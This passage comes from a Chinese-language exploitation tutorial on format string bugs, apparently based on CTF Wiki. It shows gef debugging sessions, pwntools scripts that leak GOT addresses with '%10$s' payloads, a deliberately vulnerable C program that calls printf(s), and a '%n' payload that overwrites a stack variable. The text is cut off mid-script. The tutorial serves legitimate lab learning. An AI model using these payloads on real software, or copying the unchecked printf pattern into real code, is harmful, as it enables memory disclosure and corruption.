0xffffe000 0x00000000 rw- [stack]gef➤  x/x 0x243031250x24303125:    Cannot access memory at address 0x24303125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然0xffffd008处所对应的格式化字符串所对应的变量值0x24303125并不能够被该程序访问，所以程序自然就崩溃了。</p><p>那么如果我们设置一个可以访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p><p>首先，获取scanf@got的地址，如下</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  got/home/devil/leakmemory:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE 08049ffc R_386_GLOB_DAT    __gmon_start__0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.00804a010 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a014 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a018 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面我们利用pwntools构造payload如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>__isoc99_scanf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%10$s'</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#remove the first bytes of __isoc99_scanf@got</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实，我们使用gdb.attach(sh)来进行调试。当我们运行到第二个printf函数的时候(要在调试窗口用 “b printf”命令给printf函数下断点)，可以看到我们的第四个参数(stack上第一个地址是返回地址，第二个是格式化字符串地址，之后依次为第一…四个参数)确实指向我们的scanf的地址，这里输出</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7f1d87c  →  0x00000000$esp   : 0xff8ccb9c  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xff8ccc48  →  0x00000000$esi   : 0xf7f1c000  →  0x001b1db0$edi   : 0xf7f1c000  →  0x001b1db0$eip   : 0xf7db3670  →  <printf+0> call 0xf7e89b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff8ccb9c│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xff8ccba0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xff8ccba4│+0x0008: 0x000000010xff8ccba8│+0x000c: 0x222222220xff8ccbac│+0x0010: 0xffffffff0xff8ccbb0│+0x0014: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp0xff8ccbb4│+0x0018: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp0xff8ccbb8│+0x001c: 0xf7f63918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7db3667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7db366d                  nop       0xf7db366e                  xchg   ax, ax → 0xf7db3670 <printf+0>       call   0xf7e89b59 <__x86.get_pc_thunk.ax>   ↳  0xf7e89b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7e89b5c <__x86.get_pc_thunk.ax+3> ret          0xf7e89b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7e89b60 <__x86.get_pc_thunk.dx+3> ret          0xf7e89b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7e89b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7db3670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7db3670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在我们运行的terminal下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py[+] Starting local process './leakmemory': pid 2673[*] '/home/devil/leakmemory'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)0x804a018\x18\x04%10$s[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 2673 -x "/tmp/pwnqnvV9v.gdb"[+] Waiting for debugger: Done0xf7dc60c0[*] Switching to interactive mode[*] Process './leakmemory' stopped with exit code 0 (pid 2673)[*] Got EOF while reading in interactive$  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们确实得到了scanf的地址。</p><blockquote><p>Wiki上这里是用scanf举例说明的，并且表示之所以没有使用printf函数，是因为printf函数会对0a,0b,0c,00等字符有一些奇怪的处理，导致无法正常读入。</p></blockquote><p>所以我就尝试了一下泄露printf函数的地址。</p><p>构造payload如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%10$s'</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>terminal运行结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py[+] Starting local process './leakmemory': pid 2747[*] '/home/devil/leakmemory'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)0x804a00c\x0c\x04%10$s[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 2747 -x "/tmp/pwn71yrFD.gdb"[+] Waiting for debugger: DoneTraceback (most recent call last):  File "exp.py", line 11, in <module>    print(hex(u32(sh.recv()[4:8])))  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 82, in recv    return self._recv(numb, timeout) or b''  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 160, in _recv    if not self.buffer and not self._fillbuffer(timeout):  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 131, in _fillbuffer    data = self.recv_raw(self.buffer.get_fill_size())  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/process.py", line 707, in recv_raw    raise EOFErrorEOFError[*] Process './leakmemory' stopped with exit code -11 (SIGSEGV) (pid 2747)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈上的值如下</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffc82d58  →  0x250804a0$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7eca87c  →  0x00000000$esp   : 0xffc82d1c  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffc82dc8  →  0x00000000$esi   : 0xf7ec9000  →  0x001b1db0$edi   : 0xf7ec9000  →  0x001b1db0$eip   : 0xf7d60670  →  <printf+0> call 0xf7e36b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffc82d1c│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffc82d20│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffc82d24│+0x0008: 0x000000010xffc82d28│+0x000c: 0x222222220xffc82d2c│+0x0010: 0xffffffff0xffc82d30│+0x0014: 0xffc82d58  →  0x250804a00xffc82d34│+0x0018: 0xffc82d58  →  0x250804a00xffc82d38│+0x001c: 0xf7f10918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7d60667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7d6066d                  nop       0xf7d6066e                  xchg   ax, ax → 0xf7d60670 <printf+0>       call   0xf7e36b59 <__x86.get_pc_thunk.ax>   ↳  0xf7e36b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7e36b5c <__x86.get_pc_thunk.ax+3> ret          0xf7e36b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7e36b60 <__x86.get_pc_thunk.dx+3> ret          0xf7e36b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7e36b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7d60670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7d60670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见程序并没有如同预期一样输出printf的地址。</p><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p><pre><code>[padding][addr]</code></pre><p>注意</p><blockquote><p>我们在gef中使用got命令的时候，已经打印出了printf的got地址</p><p>0804a00c R_386_JUMP_SLOT   <a href="mailto:printf@GLIBC_2.0">printf@GLIBC_2.0</a></p><p>但是我们不能直接在命令行输入\x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是会将\,x,0,c分别作为一个字符进行读入。下面就是错误的例子。</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">gef➤  rStarting program: /home/devil/leakmemory \\x0c\\xa0\\x04\\x08%10$s00000001.22222222.ffffffff.\\x0c\\xa0\\x04\\x08%10$sProgram received signal SIGSEGV, Segmentation fault.__strlen_ia32 () at ../sysdeps/i386/i686/multiarch/../../i586/strlen.S:9494    ../sysdeps/i386/i686/multiarch/../../i586/strlen.S: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0x30785c5c ("\\x0"?)$ebx   : 0x0       $ecx   : 0xf7fb6000  →  0x001b1db0$edx   : 0x0       $esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x10$ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000$esi   : 0xffffc680  →  0xffffffff$edi   : 0xf7fb6d60  →  0xfbad2a84$eip   : 0xf7e795f1  →  <__strlen_ia32+49> mov ecx, DWORD PTR [eax]$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow RESUME virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffc4ec│+0x0000: 0xf7e45977  →  <printf_positional+7575> add esp, 0x10     ← $esp0xffffc4f0│+0x0004: 0x30785c5c ("\x0"?)0xffffc4f4│+0x0008: 0x000000000xffffc4f8│+0x000c: 0x00000028 ("("?)0xffffc4fc│+0x0010: 0x000000000xffffc500│+0x0014: 0xffffd008  →  "\x0c\xa0\x04\x08%10$s"0xffffc504│+0x0018: 0x000000000xffffc508│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e795e7 <__strlen_ia32+39> xor    BYTE PTR [edi], cl   0xf7e795e9 <__strlen_ia32+41> test   BYTE PTR [eax+0x40000000], cl   0xf7e795ef <__strlen_ia32+47> xor    edx, edx → 0xf7e795f1 <__strlen_ia32+49> mov    ecx, DWORD PTR [eax]   0xf7e795f3 <__strlen_ia32+51> add    eax, 0x4   0xf7e795f6 <__strlen_ia32+54> sub    edx, ecx   0xf7e795f8 <__strlen_ia32+56> add    ecx, 0xfefefeff   0xf7e795fe <__strlen_ia32+62> dec    edx   0xf7e795ff <__strlen_ia32+63> jae    0xf7e79659 <__strlen_ia32+153>─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e795f1 in __strlen_ia32 (), reason: SIGSEGV───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e795f1 → __strlen_ia32()[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x14, nspecs_done=0x0, lead_str_end=0xffffd01c "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)[#3] 0xf7e4d696 → __printf(format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s")[#4] 0x804852c → main()────────────────────────────────────────────────────────────────────────────────gef➤  x/x 0xffffd0080xffffd008:    0x30785c5c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p><blockquote><p>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p></blockquote><p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，<strong>一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量</strong>。</p><p>这里我们给出如下的程序来介绍相应的部分。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    #<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数要放在<span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>前面，确保第一次在printf中断时，程序已经读入格式化字符串  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里和wiki上有点区别，就在于第一个scanf(“%s”,s)和printf(“%p\n”,&amp;c)的顺序。wiki上是printf在前，但是我按照他那样编译调试的时候stack中不能同时显示c的地址和格式化字符串的地址，所以我换了一下位置进行编译调试。但在后面修改c的值的时候，用此脚本编译出来的程序在接收c地址的时候出了点问题。</p></blockquote><p>编译成32位程序</p><pre class="line-numbers language-sh"><code class="language-sh">devil@ubuntu:~$ gcc -m32 -fno-stack-protector -no-pie -o overflow overflow.coverflow.c: In function ‘main’:overflow.c:9:10: warning: format not a string literal and no format arguments [-Wformat-security]   printf(s);          ^<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p><pre class="line-numbers language-sh"><code class="language-sh">...[overwrite addr]....%[overwrite offset]$n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中…表示我们的填充内容，overwrite addr表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数()。这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb overflowgef➤  b printfBreakpoint 1 at 0x8048340gef➤  rStarting program: /home/devil/overflow %d%dBreakpoint 1, __printf (format=0x80485c3 "%p\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd06c  →  0x00000315$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfec  →  0x080484c8  →  <main+61> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfec│+0x0000: 0x080484c8  →  <main+61> add esp, 0x10     ← $esp0xffffcff0│+0x0004: 0x080485c3  →  "%p\n"0xffffcff4│+0x0008: 0xffffd06c  →  0x000003150xffffcff8│+0x000c: 0x000000c20xffffcffc│+0x0010: 0xf7e946bb  →  <handle_intel+107> add esp, 0x100xffffd000│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffd004│+0x0018: 0xffffd12c  →  0xffffd30a  →  "XDG_VTNR=7"0xffffd008│+0x001c: "%d%d"─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "overflow", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485c3 "%p\n")[#1] 0x80484c8 → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现在0xffffcff4处存储着变量c的数值(789==0x315)。继而，我们再确定格式化字符串’%d%d’的地址0xffffd008相对于printf函数的格式化字符串参数0xffffcff0的偏移为0x18，即格式化字符串地址相当于printf函数的第7个参数(0xffffcfec是printf函数的返回地址)，相当于格式化字符串的第6个参数。</p><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p><pre><code>[address of c]%012d%6$n</code></pre><p>address of c的长度为4(32位程序)，故而我们得再输入12个字符才可以达到16个字符，以便来修改c的值为16。</p><blockquote><p>参数n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。前面已经成果输出了16个字符了，所以在这就相当于把格式化字符串的第6个参数c的值改写成了16。</p><p>参数012d：如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。这里把012d换成’a’*12也可以。</p></blockquote><p>具体脚本如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">forc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./overwrite'</span><span class="token punctuation">)</span>    c_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#原来是printf("%p\n",&amp;c);drop=True表示接收\n之前的值,16表示以16进制的形式。</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p32<span class="token 